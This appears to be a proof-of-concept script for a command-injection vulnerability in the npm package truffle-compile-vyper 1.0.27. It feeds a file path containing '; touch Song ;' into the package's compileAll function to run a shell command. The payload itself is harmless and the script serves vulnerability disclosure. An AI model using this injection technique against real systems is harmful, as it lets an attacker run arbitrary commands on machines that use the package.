/**truffle-compile-vyper@1.0.27 is vulnerable to command injection.
 * 
  * the injection point is located in line 97 of file "index.js" in function execVyper(),
  * which is call by compileAll() function.
 * the first argument options in compileAll() function can be controlled by users
 * without any sanitization .
 */

var test = require("truffle-compile-vyper");
var opts = {
  "paths": [
    "; touch Song ;/a.vy"],
  "compilers": {'vyper': "none"}
}
test(opts, function(){});
